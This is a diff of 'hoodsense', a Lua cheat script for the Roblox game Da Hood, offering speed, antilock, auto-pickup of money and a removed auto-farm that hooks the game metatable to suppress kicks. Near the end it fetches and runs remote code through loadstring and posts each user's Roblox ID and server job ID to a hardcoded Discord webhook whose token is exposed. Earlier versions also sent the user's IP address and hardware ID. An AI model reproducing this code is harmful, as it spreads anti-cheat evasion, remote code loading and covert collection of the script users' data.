-local speedboost = Section9:CreateButton("Speed", function()
+local speedboost = scriptsSection:AddButton("Speed", function()
     plr = game:GetService('Players').LocalPlayer
     down = true
      
@@ -1488,10 +1609,15 @@ local speedboost = Section9:CreateButton("Speed", function()
         mouse.KeyUp:connect(function(m) if m:lower()=="c"then onButton1Up(mouse)end end)
     end
     onSelected(game.Players.LocalPlayer:GetMouse())
+        game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Speed keybind is C.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+    })
 end)
-speedboost:AddToolTip("Makes you faster when pressing 'C'")
 getgenv().Multiplier = -0.27
-local antilock = Section9:CreateButton("Antilock", function()
+local antilock = scriptsSection:AddButton("Antilock", function()
     local userInput = game:service('UserInputService')
     local runService = game:service('RunService')
     userInput.InputBegan:connect(function(Key)
@@ -1505,117 +1631,23 @@ local antilock = Section9:CreateButton("Antilock", function()
         end
     end
 end)
-end)
-antilock:AddToolTip("Enables antilock [H].")
-
-local autofarm = section54:CreateToggle("Auto Farm", nil, function(texto)
-	repeat
-		wait()
-	until game:IsLoaded()
-	local gm = getrawmetatable(game)
-	setreadonly(gm, false)
-	local namecall = gm.__namecall
-	gm.__namecall =
-		newcclosure(
-		function(self, ...)
-			local args = {...}
-			if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
-				if tostring(getcallingscript()) ~= "Framework" then
-					return
-				end
-			end
-			if not checkcaller() and getnamecallmethod() == "Kick" then
-				return
-			end
-			return namecall(self, unpack(args))
-		end
-	)
-	
-	local LocalPlayer = game:GetService("Players").LocalPlayer
-	
-	function gettarget()
-		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
-		local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
-		local maxdistance = math.huge
-		local target
-		for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
-			if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
-				local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
-				if distance < maxdistance then
-					target = v
-					maxdistance = distance
-				end
-			end
-		end
-		return target
-	end
-	
-	for i, v in pairs(workspace:GetDescendants()) do
-		if v:IsA("Seat") then
-			v:Destroy()
-		end
-	end
-	
-	shared.MoneyFarm = texto
-	
-	while shared.MoneyFarm do
-		wait()
-		local Target = gettarget()
-		repeat
-			wait()
-			pcall(
-				function()
-					local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
-					local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
-					local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat")
-					if not Combat then
-						Character:FindFirstChild("Humanoid").Health = 0
-						return
-					end
-					HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3)
-					Combat.Parent = Character
-					Combat:Activate()
-				end
-			)
-		until not Target or Target.Humanoid.Health < 0
-		for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
-			if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then
-				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
-				local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
-				if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
-					repeat
-						wait()
-						fireclickdetector(v)
-					until not v or not v.Parent.Parent
-				end
-			end
-		end
-		wait(1)
-	end
-end)
-autofarm:CreateKeybind("", function()
-end)
-autofarm:AddToolTip("Enables Autofarm.")
-------------------------
----// CREDITS PAGE ---
-local CreditsLabel1 = Section13:CreateLabel("Made with love by hoodsense team!")
-CreditsLabel1:UpdateText("Made with love by hoodsense team!")
-local discord = Section13:CreateButton("Brought to you by hoodsense.", function(bool)
-    setclipboard("pawel#0008 <@804245361894883339> | xdzz#2137 <@935540113369346130> | https://hoodsense.cf/")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
+        Title = "hoodsense";
+        Text = "Antilock keybind is H.";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+    })
+end)
+
+
+local CreditsTab = Window:CreateTab("Credits")
+local CreditsSection = CreditsTab:CreateSector("Developers", "left")
+local discord = CreditsSection:AddButton("Our Developing Team", function(bool)
+    setclipboard("pawel#0008 <@804245361894883339> | $ Adxn#0001 <@818413928841084938> | https://hoodsense.cf/")
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense";
+        Text = "Our team copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
         callbakc = bindableFunction;
@@ -1623,22 +1655,11 @@ local discord = Section13:CreateButton("Brought to you by hoodsense.", function(
     })
 end)
 
-local esko = Section13:CreateButton("Owned by ekso.gq", function(bool)
+local esko = CreditsSection:AddButton("Owned by ekso.gq", function(bool)
     setclipboard("https://ekso.gq")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
+        Title = "hoodsense";
+        Text = "Owner copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
         callbakc = bindableFunction;
@@ -1646,98 +1667,35 @@ local esko = Section13:CreateButton("Owned by ekso.gq", function(bool)
     })
 end)
 
-local CreditsLabel2 = Section13:CreateLabel("© 2022 ekso.gq")
-CreditsLabel2:UpdateText("(C) 2022 ekso.gq")
-local CreditsLabel3 = Section13:CreateLabel("Staff")
-CreditsLabel3:UpdateText("Staff")
-
-local discord1 = Section13:CreateButton("pawel#0008", function(bool)
+local discord1 = CreditsSection:AddButton("pawel#0008", function(bool)
     setclipboard("pawel#0008 <@804245361894883339>")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
+        Title = "hoodsense";
+        Text = "Staff member copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
         callbakc = bindableFunction;
         Button1 = "Okay!";
     })
 end)
-discord1:AddToolTip("Main developer.")
 
-local discord2 = Section13:CreateButton("$ Adxn#0001", function(bool)
+local discord2 = CreditsSection:AddButton("$ Adxn#0001", function(bool)
     setclipboard("$ Adxn#0001 <@818413928841084938>")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-		print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
+        Title = "hoodsense";
+        Text = "Staff member copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
         callbakc = bindableFunction;
         Button1 = "Okay!";
     })
 end)
-discord2:AddToolTip("Staff Member.")
 
---[[local discord = Section13:CreateButton("! ave#0005", function(bool)
-    setclipboard("! ave#0005 <@557671767565664285>")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
-        Icon = "rbxassetid://8768441000";
-        Duration = "BLANK";
-        callbakc = bindableFunction;
-        Button1 = "Okay!";
-    })
-end)]]--
-
-local discord3 = Section13:CreateButton("Copy website link.", function(bool)
+local discord3 = CreditsSection:AddButton("Copy website link.", function(bool)
     setclipboard("http://hoodsense.cf")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
-        Text = "Credits Copied on clipboard!";
+        Title = "hoodsense";
+        Text = "Website copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
         callbakc = bindableFunction;
@@ -1745,24 +1703,11 @@ local discord3 = Section13:CreateButton("Copy website link.", function(bool)
     })
 end)
 
-local partnerslabel1 = Section10:CreateLabel("Da hood cash services")
-partnerslabel1:UpdateText("Da hood cash services")
-
-local partners1 = Section10:CreateButton("discord.gg/azq", function(bool)
+local partnersSection = CreditsTab:CreateSector("Partners", "right")
+local partners1 = partnersSection:AddButton("discord.gg/azq", function(bool)
     setclipboard("https://discord.gg/azq")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1771,24 +1716,10 @@ local partners1 = Section10:CreateButton("discord.gg/azq", function(bool)
     })
 end)
 
-local partnerslabel2 = Section10:CreateLabel("Other supporters")
-partnerslabel2:UpdateText("Other supporters")
-
-local partners2 = Section10:CreateButton("v3rmillion.net", function(bool)
+local partners2 = partnersSection:AddButton("v3rmillion.net", function(bool)
     setclipboard("https://v3rmillion.net")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1796,21 +1727,10 @@ local partners2 = Section10:CreateButton("v3rmillion.net", function(bool)
         Button1 = "Okay!";
     })
 end)
-local partners = Section10:CreateButton("x.synapse.to", function(bool)
+local partners = partnersSection:AddButton("x.synapse.to", function(bool)
     setclipboard("https://x.synapse.to")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1819,21 +1739,10 @@ local partners = Section10:CreateButton("x.synapse.to", function(bool)
     })
 end)
 
-local partners4 = Section10:CreateButton("krnl.ca", function(bool)
+local partners4 = partnersSection:AddButton("krnl.ca", function(bool)
     setclipboard("https://krnl.ca")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1842,21 +1751,10 @@ local partners4 = Section10:CreateButton("krnl.ca", function(bool)
     })
 end)
 
-local partners6 = Section10:CreateButton("angxlzz", function(bool)
+local partners6 = partnersSection:AddButton("angxlzz", function(bool)
     setclipboard("https://youtube.com/angxlzz")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1865,21 +1763,10 @@ local partners6 = Section10:CreateButton("angxlzz", function(bool)
     })
 end)
 
-local partners5 = Section10:CreateButton("ekso.gq", function(bool)
+local partners5 = partnersSection:AddButton("ekso.gq", function(bool)
     setclipboard("https://ekso.gq")
-    wait(1)
-    local function callback(text)
-        if text == "Yes" then
-        print("")
-        elseif text == "No" then
-        print("")
-        end
-    end
-    
-    local bindableFunction= Instance.new("BindableFunction")
-    
     game.StarterGui:SetCore("SendNotification", {
-        Title = "hoodsense.cc";
+        Title = "hoodsense";
         Text = "Supporter Copied on clipboard!";
         Icon = "rbxassetid://8768441000";
         Duration = "BLANK";
@@ -1887,57 +1774,62 @@ local partners5 = Section10:CreateButton("ekso.gq", function(bool)
         Button1 = "Okay!";
     })
 end)
-------------------------
-local Toggle3 = Section3:CreateToggle("UI Toggle", nil, function(State)
-	Window:Toggle(State)
-end)
-Toggle3:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key)
-	Config.Keybind = Enum.KeyCode[Key]
-end)
-Toggle3:SetState(true)
 
-local Colorpicker3 = Section3:CreateColorpicker("UI Color", function(Color)
-	Window:ChangeColor(Color)
-end)
-Colorpicker3:UpdateColor(Config.Color)
+function Alive(Player)
+    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") ~= nil and Player.Character:FindFirstChild("Humanoid") ~= nil and Player.Character:FindFirstChild("Head") ~= nil then
+        return true
+    end
+    return false
+end
 
--- credits to jan for patterns
-local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagons","Circles","Flowers","Waves"}, function(Name)
-	if Name == "Default" then
-		Window:SetBackground("5553946656")
-	elseif Name == "Hearts" then
-		Window:SetBackground("6073763717")
-	elseif Name == "Abstract" then
-		Window:SetBackground("6073743871")
-	elseif Name == "Hexagons" then
-		Window:SetBackground("6073628839")
-	elseif Name == "Circles" then
-		Window:SetBackground("6071579801")
-	elseif Name == "Flowers" then
-		Window:SetBackground("6071575925")
-	elseif Name == "Waves" then
-		Window:SetBackground("2151741365")
-	end
+local GetService = setmetatable({}, {
+    __index = function(self, key)
+        return game:GetService(key)
+    end
+})
+local RunSer = GetService.RunService
+RunSer.Heartbeat:Connect(function()
+    if Alive(LocalPlayer) then
+        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
+            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Default" then
+                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
+                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
+                    end
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
+            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Fast" and Alive(LocalPlayer) then
+                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
+                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
+                    end
+                end
+            end
+        end
+        if PuppywareSettings.Blatant.Cash.AutoPickCash then
+            pcall(function()
+                for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
+                    if v.Name == "MoneyDrop" then
+                        local MoneyMagnitude = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude
+                        if MoneyMagnitude < 25 then
+                            fireclickdetector(v.ClickDetector)
+                        end 
+                    end
+                end
+            end)
+        end
+        if PuppywareSettings.Blatant.Character.AntiBag then
+            if LocalPlayer.Character:FindFirstChild("Christmas_Sock") then
+                LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy()
+            end
+        end
+    end
 end)
-Dropdown3:SetOption("Default")
-
-local Colorpicker4 = Section4:CreateColorpicker("Color", function(Color)
-	Window:SetBackgroundColor(Color)
-end)
-Colorpicker4:UpdateColor(Color3.new(0, 0, 0))
-
-local Slider3 = Section4:CreateSlider("Transparency",0,1,nil,false, function(Value)
-	Window:SetBackgroundTransparency(Value)
-end)
-Slider3:SetValue(0)
-
-local Slider4 = Section4:CreateSlider("Tile Scale",0,1,nil,false, function(Value)
-	Window:SetTileScale(Value)
-end)
-Slider4:SetValue(0.25)
 
 game.StarterGui:SetCore("SendNotification", {
-    Title = "hoodsense.cc";
+    Title = "hoodsense";
     Text = "Succesfully loaded!";
     Icon = "http://www.roblox.com/asset/?id=8768441000";
     Duration = "4";
@@ -1945,13 +1837,14 @@ game.StarterGui:SetCore("SendNotification", {
 })
 wait(8)
 game.StarterGui:SetCore("SendNotification", {
-    Title = "hoodsense.cc";
+    Title = "hoodsense";
     Text = "https://hoodsense.cf";
     Icon = "http://www.roblox.com/asset/?id=8768441000";
     Duration = "3";
     callbakc = bindableFunction;
     Button1 = "Okay!";
 })
+
 
 print("___________________________HOODSENSE.CC__________________________")
 print("| [hoodsense.cc] Executed version: 6.0")
@@ -1977,7 +1870,7 @@ end)
 wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 
-local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
+local url = 'https://discord.com/api/webhooks/967518913640423465/FBg8z2nuXawcLb-hWVnkAEvsQL8Z_LGtNADlTynqoHHguw_XPnzH2rmGf5_UbodYDuOl'
 local req = syn.request
 local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
 local OSTime = os.time()
@@ -2044,15 +1937,6 @@ local data = {
                     ["name"] = "Job Id",
                     ["value"] = "```"..game.JobId.."```"
                 },
-                {
-                    ["name"] = "Hard Ware ID:",
-                    ["value"] = tostring("```"..hwid().."```"),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "IP ADDRESS:",
-                    ["value"] = tostring("```"..ip().."```"),
-                },
             },
             ["thumbnail"] = {
                 ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
@@ -2062,16 +1946,16 @@ local data = {
 }
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
 
--------------------------------------------------------------------------
---[[
+--[[-----------------------------------------------------------------------
+
 ██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
 ██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
-███████║██║░░██║██║░░██║██║░░██║╚█████╗░████╗░░██╔██╗██║╚█████╗░█████╗░░
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░████╗ ░░██╔██╗██║╚█████╗░█████╗░░
 ██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
 ██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
 ╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
-]]
--------------------------------------------------------------------------
+
+-------------------------------------------------------------------------]]
 while true do
 warn("---------------------------")
 warn("---------------------------")
@@ -2258,7 +2142,7 @@ warn("-[[[[][][][][][][][][][]]]-")
 warn("---------------------------")
 warn("---------------------------")
 print("                          ")
-print("[hoodsense.cc] Kicu to gej!")
-print("[hoodsense.cc] Kc kuba<3  !")
+print("[hoodsense.cc] Kicu kreci lody")
+print("[hoodsense.cc] Kc waneska<3")
 wait(69420)
 end
